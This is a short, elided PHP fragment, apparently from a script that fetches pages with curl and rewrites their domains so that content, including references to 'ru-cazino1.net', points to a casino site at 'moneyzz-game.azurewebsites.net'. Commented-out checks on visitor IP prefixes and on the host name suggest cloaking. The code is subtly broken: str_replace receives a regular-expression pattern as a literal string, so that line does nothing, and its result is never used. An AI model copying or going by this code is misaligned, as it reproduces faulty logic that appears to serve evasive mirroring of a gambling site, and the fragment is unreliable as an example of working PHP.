...
// if(strpos( $ip , "178.176" ) === 0 || strpos( $ip , "31.173" ) === 0 || strpos( $ip , "213.141" ) === 0  || strpos( $ip , "188.162" ) === 0 || strpos( $ip , "188.170" ) === 0 || strpos( $ip , "176.59" ) === 0 || strpos( $ip , "188.170" ) === 0)
   // {	
    ...
    // }
// }
// if ( $_SERVER["HTTP_HOST"] != "moneyzz-game.azurewebsites.net" ) {
...
curl_close( $ch );
$bodytag = str_replace( "((?!ru-cazino1\.net/b)\w+(?:\.\w+)+", "https://moneyzz-game.azurewebsites.net/", $contents );
$result  = preg_replace( '~' . $new_url . '~m', "moneyzz-game.azurewebsites.net", $contents );
